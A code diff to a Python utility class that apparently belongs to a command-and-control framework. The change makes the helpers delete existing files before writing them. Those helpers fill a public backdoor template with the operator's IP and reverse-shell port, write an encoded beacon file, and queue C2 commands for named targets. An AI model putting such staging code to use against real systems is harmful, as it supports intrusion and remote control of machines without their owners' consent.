@@ -203,14 +203,20 @@ class Utility:
         try:
             selfip4mal = selfip + ";"
             b644mal = base64.b64encode(selfip4mal.encode()).decode()
-            with open(os.path.join(self.full_path, "public/_.syspoll-b64"), 'wb') as f11:
+            p = os.path.join(self.full_path, "public/_.syspoll-b64")
+            if os.path.exists(p):
+                os.unlink(p)
+            with open(p, 'wb') as f11:
                 f11.write(b644mal.encode())
         except Exception as e:
             self.print_exception(e, 'Failed to generate syspoll-b64 file.')
         
         try:
             filename = target + ".cmd"
-            with open(os.path.join(self.full_path, "tools/c2s/cmd/" + filename), 'wb') as f12:
+            p = os.path.join(self.full_path, "tools/c2s/cmd/" + filename)
+            if os.path.exists(p):
+                os.unlink(p)
+            with open(p, 'wb') as f12:
                 f12.write("".encode())
         except Exception as e:
             self.print_exception(e, 'Failed to generate %s file.' % filename)
@@ -221,7 +227,10 @@ class Utility:
                 # read whole file
                 bd_base = f21.read()
                 bd_base = bd_base.decode() % (selfip, rshellport)
-                with open(os.path.join(self.full_path, "public/bd.txt"), 'wb') as f22:
+                p = os.path.join(self.full_path, "public/bd.txt")
+                if os.path.exists(p):
+                    os.unlink(p)
+                with open(p, 'wb') as f22:
                     # write data
                     f22.write(bd_base.encode())
         except Exception as e:
@@ -229,10 +238,13 @@ class Utility:
 
 
     # append c2 command to file
-    def add_c2cmd(self, target, cmd):     
+    def add_c2cmd(self, target, cmd):
         try:
             filename = target + ".cmd"
-            with open(os.path.join(self.full_path, "tools/c2s/cmd/" + filename), 'wb') as f11:
+            p = os.path.join(self.full_path, "tools/c2s/cmd/" + filename)
+            if os.path.exists(p):
+                os.unlink(p)
+            with open(p, 'wb') as f11:
                 buildcmd = "1\t" + cmd + "\n"
                 f11.write(buildcmd.encode())
         except Exception as e:
